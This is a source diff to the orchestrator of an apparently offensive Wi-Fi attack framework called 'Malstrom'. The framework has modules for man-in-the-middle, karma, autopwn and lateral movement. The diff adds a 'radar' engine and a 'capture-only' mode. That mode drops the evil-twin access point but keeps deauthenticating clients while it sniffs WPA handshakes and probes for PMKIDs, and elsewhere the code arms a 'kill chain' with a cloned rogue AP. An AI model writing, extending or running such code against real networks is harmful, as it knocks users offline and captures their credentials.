@@ -27,6 +27,7 @@ from . import mitm
 from . import monitor
 from . import notify
 from . import portal
+from . import radar
 from . import scan
 from . import services
 from . import state
@@ -49,7 +50,8 @@ def _clone_sig(st):
     return (st.get('target_ssid'), st.get('target_bssid'),
             st.get('target_channel'), st.get('portal_mode'), st.get('wpa_psk'),
             st.get('portal_ssid'), st.get('clone_bssid'),
-            st.get('wpa3_transition'), st.get('ssid_cloak'))
+            st.get('wpa3_transition'), st.get('ssid_cloak'),
+            bool(st.get('capture_only')))
 
 
 class Malstrom(object):
@@ -60,6 +62,7 @@ class Malstrom(object):
         self.capture = capture.CaptureEngine()
         self.verify = verify.VerifyEngine()
         self.karma = karma.KarmaEngine()
+        self.radar = radar.RadarEngine()
         self.autopwn = autopwn.AutopwnEngine(self)
         self.scan = scan.ScanEngine()
         self.lateral = lateral.LateralEngine()
@@ -369,6 +372,7 @@ class Malstrom(object):
                 was = self._armed
                 now = bool(st.get('active'))
                 sig = _clone_sig(st)
+                capture_only = bool(st.get('capture_only'))
                 if now and not was:
                     self._armed = True
                     self._cfg_sig = sig
@@ -382,16 +386,35 @@ class Malstrom(object):
                                    'fresh engagement: dropped %d stale client '
                                    'IP shields — portal served to everyone '
                                    'again' % dropped)
-                    ok = self._clone(st)
-                    self.deauth.set_rogue(self.stack.ap_iface,
-                                          st.get('target_channel'))
-                    state.emit('DEP', 'kill chain armed: %s (%s) ch%s [%s deauth]%s' % (
-                        st.get('target_ssid', '?'), st.get('target_bssid', '?'),
-                        st.get('target_channel', '?'), st.get('deauth_mode', '?'),
-                        '' if ok else ' — rogue AP DOWN, engine retries (deauth paused)'))
-                    if not ok:
-                        self.deauth.stop()
-                        state.emit('ALERT', 'hostapd could not bring the rogue AP up')
+                    if capture_only:
+                        # pwnagotchi-style: no evil twin, because an open clone
+                        # advertising the same SSID steals the clients whose
+                        # WPA handshake we are waiting for.
+                        if self._stack_up:
+                            try:
+                                self.stack.cleanup()
+                            except Exception as exc:
+                                state.emit('ALERT', 'stack teardown error: %s'
+                                           % exc)
+                            self._stack_up = False
+                        self.deauth.set_rogue(None, st.get('target_channel'))
+                        state.emit('DEP', 'capture-only engagement armed: %s '
+                                   '(%s) ch%s [deauth + sniffer + PMKID probe, '
+                                   'no twin]' % (
+                                       st.get('target_ssid', '?'),
+                                       st.get('target_bssid', '?'),
+                                       st.get('target_channel', '?')))
+                    else:
+                        ok = self._clone(st)
+                        self.deauth.set_rogue(self.stack.ap_iface,
+                                              st.get('target_channel'))
+                        state.emit('DEP', 'kill chain armed: %s (%s) ch%s [%s deauth]%s' % (
+                            st.get('target_ssid', '?'), st.get('target_bssid', '?'),
+                            st.get('target_channel', '?'), st.get('deauth_mode', '?'),
+                            '' if ok else ' — rogue AP DOWN, engine retries (deauth paused)'))
+                        if not ok:
+                            self.deauth.stop()
+                            state.emit('ALERT', 'hostapd could not bring the rogue AP up')
                 elif was and not now:
                     self._armed = False
                     self.deauth.stop()
@@ -410,24 +433,35 @@ class Malstrom(object):
 
                 if now and sig != self._cfg_sig:
                     self._cfg_sig = sig
-                    ok = self._clone(st)
-                    if not ok and self._armed:
-                        self.deauth.stop()
+                    if capture_only:
+                        if self._stack_up:
+                            try:
+                                self.stack.cleanup()
+                            except Exception as exc:
+                                state.emit('ALERT',
+                                           'stack teardown error: %s' % exc)
+                            self._stack_up = False
+                    else:
+                        ok = self._clone(st)
+                        if not ok and self._armed:
+                            self.deauth.stop()
                 if now:
                     cfg = (st.get('target_bssid'), st.get('target_channel'),
                            st.get('deauth_mode'), st.get('deauth_burst'),
                            st.get('deauth_delay'), st.get('deauth_continuous'))
-                    self.deauth.set_rogue(self.stack.ap_iface,
-                                          st.get('target_channel'))
+                    self.deauth.set_rogue(
+                        None if capture_only else self.stack.ap_iface,
+                        st.get('target_channel'))
                     if getattr(self.deauth, '_cfg', None) != cfg:
                         self.deauth.stop()
                         self.deauth._cfg = cfg
-                        if self._stack_up:
+                        if self._stack_up or capture_only:
                             self.deauth.start(st)
-                    self._retry_stack(st)
-                    if self._stack_up and self._hostapd_alive() \
-                            and not st.get('clone_bssid'):
-                        self._maybe_rotate(st)
+                    if not capture_only:
+                        self._retry_stack(st)
+                        if self._stack_up and self._hostapd_alive() \
+                                and not st.get('clone_bssid'):
+                            self._maybe_rotate(st)
 
                 self.monitor.cycle()
                 self.capture.set_cmd(
@@ -447,10 +481,11 @@ class Malstrom(object):
                     channel=st.get('target_channel', ''),
                     mode=st.get('portal_mode', 'open'),
                     hop=bool(st.get('karma', True)) and config.KARMA_HOP
-                    and not now,
+                    and not now and not self.radar.hop_owned(),
                     respond=now and bool(st.get('karma', True))
                     and self._stack_up
                     and bool(st.get('karma_respond', config.KARMA_RESPOND)))
+                self.radar.set_cmd(armed=now)
                 if self._stack_up:
                     self.stack.sync_whitelist(set(state.read_whitelist()))
             except Exception as exc:  # keep the daemon alive
@@ -492,6 +527,7 @@ class Malstrom(object):
         self.capture.set_verifier(self.verify)
         self.verify.start()
         self.karma.start()
+        self.radar.start()
         self.autopwn.start()
 
         self.portal_thread = portal.start(self.beacon)
@@ -546,6 +582,10 @@ class Malstrom(object):
             pass
         try:
             self.karma.stop()
+        except Exception:
+            pass
+        try:
+            self.radar.stop()
         except Exception:
             pass
         try:
